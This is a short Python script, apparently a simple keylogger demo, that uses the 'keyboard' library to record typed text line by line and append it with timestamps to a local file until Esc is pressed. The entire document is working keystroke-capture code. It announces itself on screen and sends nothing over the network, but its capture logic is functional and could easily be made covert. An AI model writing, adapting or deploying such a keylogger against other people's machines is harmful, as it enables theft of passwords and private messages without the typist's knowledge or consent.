import keyboard
from datetime import datetime
import os

path = "keylog_data.txt"
print(f"[*] Keylogger started. Type something and press Enter. Press 'Esc' to stop.")
print(f"[DEBUG] Log file path: {os.path.abspath(path)}")

try:
    while True:
        events = keyboard.record('enter')
        typed_strings = list(keyboard.get_typed_strings(events))

        if typed_strings:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            text_to_save = f"[{timestamp}] {typed_strings[0]}"
            print(f"[LOG] {text_to_save}")

            with open(path, 'a') as data_file:
                data_file.write(text_to_save + '\n')

        if keyboard.is_pressed('esc'):
            print("[*] Keylogger stopped by user.")
            break

except Exception as e:
    print(f"[!] Error occurred: {e}")

